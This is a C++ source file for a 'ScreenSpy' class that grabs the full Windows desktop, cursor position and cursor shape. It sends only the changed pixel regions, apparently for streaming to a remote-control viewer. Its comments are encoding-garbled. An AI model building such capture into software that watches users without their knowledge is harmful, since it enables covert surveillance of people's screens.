// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenSpy.h"
#include "Common.h"
#include <stdio.h>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenSpy::CScreenSpy(ULONG ulbiBitCount)
{
	m_bAlgorithm = ALGORITHM_DIFF;
	m_ulbiBitCount = (ulbiBitCount == 16 || ulbiBitCount == 32) ? ulbiBitCount : 16;

	//::GetSystemMetrics(SM_CXSCREEN/SM_CYSCREEN)��ȡ��Ļ��С��׼
	//���統��Ļ��ʾ����Ϊ125%ʱ����ȡ������Ļ��С��Ҫ����1.25�Ŷ�
	DEVMODE devmode;
	memset(&devmode, 0, sizeof (devmode));	
	devmode.dmSize = sizeof(DEVMODE);
	devmode.dmDriverExtra = 0;
	BOOL Isgetdisplay = EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &devmode);
	m_ulFullWidth = devmode.dmPelsWidth;
	m_ulFullHeight = devmode.dmPelsHeight;
	int w = ::GetSystemMetrics(SM_CXSCREEN), h = ::GetSystemMetrics(SM_CYSCREEN);
	m_bZoomed = (w != m_ulFullWidth) || (h != m_ulFullHeight);
	m_wZoom = double(m_ulFullWidth) / w, m_hZoom = double(m_ulFullHeight) / h;
	printf("=> �������ű���: %.2f, %.2f\t�ֱ��ʣ�%d x %d\n", m_wZoom, m_hZoom, m_ulFullWidth, m_ulFullHeight);
	m_wZoom = 1.0/m_wZoom, m_hZoom = 1.0/m_hZoom;

	m_BitmapInfor_Full = new BITMAPINFO();
	memset(m_BitmapInfor_Full, 0, sizeof(BITMAPINFO));
	BITMAPINFOHEADER* BitmapInforHeader = &(m_BitmapInfor_Full->bmiHeader);
	BitmapInforHeader->biSize = sizeof(BITMAPINFOHEADER);
	BitmapInforHeader->biWidth = m_ulFullWidth; //1080
	BitmapInforHeader->biHeight = m_ulFullHeight; //1920
	BitmapInforHeader->biPlanes = 1;
	BitmapInforHeader->biBitCount = ulbiBitCount; //ͨ��Ϊ32
	BitmapInforHeader->biCompression = BI_RGB;
	BitmapInforHeader->biSizeImage =
		((BitmapInforHeader->biWidth * BitmapInforHeader->biBitCount + 31) / 32) * 4 * BitmapInforHeader->biHeight;

	m_hDeskTopWnd = GetDesktopWindow();
	m_hFullDC = GetDC(m_hDeskTopWnd);

	m_BitmapData_Full = NULL;
	m_hFullMemDC = CreateCompatibleDC(m_hFullDC);
	m_BitmapHandle	= ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);
	::SelectObject(m_hFullMemDC, m_BitmapHandle);

	m_DiffBitmapData_Full = NULL;
	m_hDiffMemDC	= CreateCompatibleDC(m_hFullDC); 
	m_DiffBitmapHandle	= ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_DiffBitmapData_Full, NULL, NULL);
	::SelectObject(m_hDiffMemDC, m_DiffBitmapHandle);

	m_RectBufferOffset = 0;
	m_RectBuffer = new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage * 2];
}


CScreenSpy::~CScreenSpy()
{
	if (m_BitmapInfor_Full != NULL)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	ReleaseDC(m_hDeskTopWnd, m_hFullDC);

	if (m_hFullMemDC!=NULL)
	{
		DeleteDC(m_hFullMemDC);

		::DeleteObject(m_BitmapHandle);
		if (m_BitmapData_Full!=NULL)
		{
			m_BitmapData_Full = NULL;
		}

		m_hFullMemDC = NULL;
	}

	if (m_hDiffMemDC!=NULL)
	{
		DeleteDC(m_hDiffMemDC);

		::DeleteObject(m_DiffBitmapHandle);
		if (m_DiffBitmapData_Full!=NULL)
		{
			m_DiffBitmapData_Full = NULL;
		}
	}

	if (m_RectBuffer)
	{
		delete[] m_RectBuffer;
		m_RectBuffer = NULL;
	}

	m_RectBufferOffset = 0;
}

LPVOID CScreenSpy::GetFirstScreenData()
{
	//���ڴ�ԭ�豸�и���λͼ��Ŀ���豸
	::BitBlt(m_hFullMemDC, 0, 0, m_ulFullWidth, m_ulFullHeight, m_hFullDC, 0, 0, SRCCOPY);

	return m_BitmapData_Full;  //�ڴ�
}

// �㷨+���λ��+�������
LPVOID CScreenSpy::GetNextScreenData(ULONG* ulNextSendLength)
{
	// ����rect������ָ��
	m_RectBufferOffset = 0;  

	// д��ʹ���������㷨
	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

	// д����λ��
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	CursorPos.x /= m_wZoom;
	CursorPos.y /= m_hZoom;
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));

	// д�뵱ǰ�������
	static CCursorInfo m_CursorInfor;
	BYTE	bCursorIndex = m_CursorInfor.getCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

	// ����Ƚ��㷨
	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// �ֶ�ɨ��ȫ��Ļ  ���µ�λͼ���뵽m_hDiffMemDC��
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);

		//����Bit���бȽ������һ���޸�m_lpvFullBits�еķ���
		*ulNextSendLength = m_RectBufferOffset + CompareBitmap((LPBYTE)m_DiffBitmapData_Full, (LPBYTE)m_BitmapData_Full, 
			m_RectBuffer + m_RectBufferOffset, m_BitmapInfor_Full->bmiHeader.biSizeImage);

		return m_RectBuffer;
	}

	return NULL;
}


VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHeight)
{
	AUTO_TICK(70);
#if COPY_ALL
	BitBlt(hdcDest, 0, 0, ulWidth, ulHeight, hdcSour, 0, 0, SRCCOPY);
#else
	const ULONG	ulJumpLine = 50;
	const ULONG	ulJumpSleep = ulJumpLine / 10; 

	for (int i = 0, ulToJump = 0; i < ulHeight; i += ulToJump)
	{
		ULONG  ulv1 = ulHeight - i;  

		if (ulv1 > ulJumpLine)  
			ulToJump = ulJumpLine; 
		else
			ulToJump = ulv1;
		BitBlt(hdcDest, 0, i, ulWidth, ulToJump, hdcSour,0, i, SRCCOPY);
		Sleep(ulJumpSleep);
	}
#endif
}


ULONG CScreenSpy::CompareBitmap(LPBYTE CompareSourData, LPBYTE CompareDestData, LPBYTE szBuffer, DWORD ulCompareLength)
{
	AUTO_TICK(20);
	// Windows�涨һ��ɨ������ռ���ֽ���������4�ı���, ������DWORD�Ƚ�
	LPDWORD	p1 = (LPDWORD)CompareDestData, p2 = (LPDWORD)CompareSourData;
	// ƫ�Ƶ�ƫ�ƣ���ͬ���ȵ�ƫ��
	ULONG ulszBufferOffset = 0, ulv1 = 0, ulv2 = 0, ulCount = 0;
	for (int i = 0; i < ulCompareLength; i += 4, ++p1, ++p2)
	{
		if (*p1 == *p2)
			continue;

		*(LPDWORD)(szBuffer + ulszBufferOffset) = i;
		// ��¼���ݴ�С�Ĵ��λ��
		ulv1 = ulszBufferOffset + sizeof(int);
		ulv2 = ulv1 + sizeof(int);
		ulCount = 0; // ���ݼ���������

		// ����Dest�е�����
		*p1 = *p2;
		*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;

		ulCount += 4;
		i += 4, p1++, p2++;	
		for (int j = i; j < ulCompareLength; j += 4, i += 4, ++p1, ++p2)
		{
			if (*p1 == *p2)
				break;
			// ����Dest�е�����
			*p1 = *p2;
			*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;
			ulCount += 4;
		}
		// д�����ݳ���
		*(LPDWORD)(szBuffer + ulv1) = ulCount;
		ulszBufferOffset = ulv2 + ulCount;
	}

	return ulszBufferOffset;
}
